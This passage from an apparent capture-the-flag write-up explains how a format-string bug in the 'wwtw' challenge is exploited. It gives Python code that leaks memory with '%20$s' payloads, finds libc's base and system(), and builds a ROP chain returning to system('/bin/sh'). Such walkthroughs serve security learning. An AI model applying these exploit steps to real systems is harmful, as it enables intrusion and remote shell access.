    <span class="Identifier">print</span> >> sys.stderr, <span class="Constant">"*** Leak 0x%04x"</span> % address
    s = <span class="Constant">"51.492137,-0.192878 "</span> + struct.pack(<span class="Constant">"<I"</span>, address) + <span class="Constant">" >>>%20$s<<<"</span>
    s = <span class="Constant">"    51.492137,-0.192878 >>>%24$s<<< "</span> + struct.pack(<span class="Constant">"<IIII"</span>, address, address, address, address)
    <span class="Comment">#print >> sys.stderr, "s", repr(s)</span>
    <span class="Identifier">print</span> s
    sys.stdout.flush()
    sys.stdin.readline() <span class="Comment"># Echoed coordinates.</span>
    resp = sys.stdin.readline()
    <span class="Comment">#print >> sys.stderr, "resp", repr(resp)</span>
    m = re.search(<span class="Constant">r'>>>(.*)<<<'</span>, resp, flags=re.DOTALL)
    <span class="Statement">while</span> m <span class="Statement">is</span> <span class="Identifier">None</span>:
        extra = sys.stdin.readline()
        <span class="Statement">assert</span> extra, <span class="Identifier">repr</span>(extra)
        resp += extra
        <span class="Identifier">print</span> >> sys.stderr, <span class="Constant">"read again"</span>, <span class="Identifier">repr</span>(resp)
        m = re.search(<span class="Constant">r'>>>(.*)<<<'</span>, resp, flags=re.DOTALL)
    <span class="Statement">assert</span> m <span class="Statement">is</span> <span class="Statement">not</span> <span class="Identifier">None</span>, <span class="Identifier">repr</span>(resp)
    resp = m.group(<span class="Constant">1</span>)
    <span class="Statement">if</span> resp == <span class="Constant">""</span>:
        resp = <span class="Constant">"</span><span class="Special">\0</span><span class="Constant">"</span>
    <span class="Statement">return</span> resp
```

Then, exactly like the last blog, we use the vulnerability to leak a return address and frame pointer, then overwrite the return address with a chosen address, and thus obtain EIP control.

### Getting libc's base address

Next, we needed an address to return to. This was a little tricky, since I wasn't able to steal a copy of their libc.so file (it's the only 32-bit level our team worked on) - that means I could easily exploit myself, because I have libc handy, but I couldn't exploit them. There's a "pwntool" module that can find base addresses given a memory leak, but it was too slow and the binary would time out before it finished (more on that later).

So, I used the format-string vulnerability and a bit of experience to get the base address of libc. We use %s in the format string to leak data from the [PLT](https://stackoverflow.com/questions/20486524/what-is-the-purpose-of-the-procedure-linkage-table) and get an address of anything in the libc binary - I chose to find printf() because it's the first one I could think of. That's at a static offset in the wwtw binary file (we already know the return address, since we leaked it off the stack, and that can be used to calculate where the PLT is).

Once I had that address, I worked my way backwards, reading the first bytes of each page (multiple of 0x1000) until I found an ELF header. Here's the code:

```
<pre id="vimCodeElement">
bf = printf_addr - <span class="Constant">0xc280</span>
<span class="Statement">while</span> <span class="Identifier">True</span>:
    <span class="Identifier">print</span> >> sys.stderr, <span class="Constant">"Checking"</span>, <span class="Identifier">hex</span>(bf), <span class="Constant">" (printf - "</span>, <span class="Identifier">hex</span>(printf_addr - bf), <span class="Constant">")..."</span>
    <span class="Identifier">str</span> = leak(bf)
    <span class="Identifier">print</span> >> sys.stderr, hexify(<span class="Identifier">str</span>)
    <span class="Statement">if</span>(<span class="Identifier">str</span>[<span class="Constant">0</span>:<span class="Constant">4</span>] == <span class="Constant">"</span><span class="Special">\x7F</span><span class="Constant">ELF"</span>):
        <span class="Statement">break</span>

    bf -= <span class="Constant">0x1000</span>
```

I now had the relative offset of printf(), which means given the address of printf(), I can find the base address deterministically.

### Getting system()'s address

Once I had the base address, I wanted to find the address of system(). I don't normally like using stuff I didn't write, because it's really hard to troubleshoot when there's a problem, but I couldn't find an easy way to do this by bruteforce, so I tried using [pwntools](https://github.com/Gallopsled/pwntools) ('leak' refers to the function shown earlier):

```
<pre id="vimCodeElement">
d = dynelf.DynELF(leak, libc_base_REAL)
system_addr = d.lookup(<span class="Constant">"system"</span>, <span class="Constant">'libc'</span>)
```

Once again, this was too slow and kept timing out. I looked at some options, like stealing the libc binary from memory by returning into the write() libc function (like I did in [ropasaurusrex](https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming)) or trying to make pwntools start where it left off after being disconnected, but none of it would work.

(in retrospect, I probably could have silently re-connected/re-solved the first half of the level in the leak() function and just continued where I left off, but that didn't occur to me till now, like two weeks later)

After fighting for far too long, I had a realization: maybe my home Internet connection just sucks. I uploaded the script to my server and it found the address on the first try (and solved the game portion like 10x faster).

### Getting "/bin/sh"'s address

Although I ended up with the address of system(), getting the address of "/bin/sh" from libc might be a bit tricky, so instead I simply put the string in my own input buffer - the same buffer that contains the format string - and calculated the offset from the leaked ebp value to that address. Since it was on the stack, it was always at a fixed offset from the saved ebp, which we had access to.

I could easily have leaked libc until I found the offset to the string, but that's completely unnecessary.

### Building the ROP chain

In the end, I had the address of system() and the address of "/bin/sh" in my buffer. I used them to construct a really simple ROP chain, similar to the one used in [r0pbaby](/2015/defcon-quals-r0pbaby-simple-64-bit-rop) (the difference is that, since we're on 32-bit for this level, we can pass the address of "/bin/sh" on the stack and don't have to worry about finding a gadget):

```
<pre id="vimCodeElement">
write_byte(return_ptr+<span class="Constant">0</span>, (system_addr >> <span class="Constant">0</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">1</span>, (system_addr >> <span class="Constant">8</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">2</span>, (system_addr >> <span class="Constant">16</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">3</span>, (system_addr >> <span class="Constant">24</span>) & <span class="Constant">0x0FF</span>)

write_byte(return_ptr+<span class="Constant">4</span>, <span class="Constant">0x5e</span>)
write_byte(return_ptr+<span class="Constant">5</span>, <span class="Constant">0x5e</span>)
write_byte(return_ptr+<span class="Constant">6</span>, <span class="Constant">0x5e</span>)
write_byte(return_ptr+<span class="Constant">7</span>, <span class="Constant">0x5e</span>)

sh_addr = buffer_addr + <span class="Constant">200</span> + FUDGE
write_byte(return_ptr+<span class="Constant">8</span>,  (sh_addr >> <span class="Constant">0</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">9</span>,  (sh_addr >> <span class="Constant">8</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">10</span>, (sh_addr >> <span class="Constant">16</span>) & <span class="Constant">0x0FF</span>)
write_byte(return_ptr+<span class="Constant">11</span>, (sh_addr >> <span class="Constant">24</span>) & <span class="Constant">0x0FF</span>)
```

Basically, I wrote the 4-byte address of system() over the actual return address in four separate printf() calls. Then I wrote 4 useless bytes (they don't really matter - they're system()'s return address so I made them something distinct so I can recognize the crash after system() returns). Then I wrote the address of "/bin/sh" over the next 4 bytes (the first parameter to system()).

Once that was done, I sent "good" coordinates - 100000,100000 - which caused the function to return. Since the return address had been overwritten, it returned to system("/bin/sh") and it was game over.

## Conclusion

I really liked this level because it was multiple parts.

First, we had to solve a game by making some simple AI.

Second, we had to find the "key" by either reverse engineering or debugging.

Third, we had to fix the timestamp using an off-by-one error.

And finally, we had to use a format string vulnerability to get EIP control and win the level.

One interesting dynamic of this level was that there were anti-debugging features in this level. One was the timeout that had to be used for the off-by-one error, since people frequently remove calls to alarm(), and the other was using the first few bytes of a function for something meaningful to mess with software breakpoints.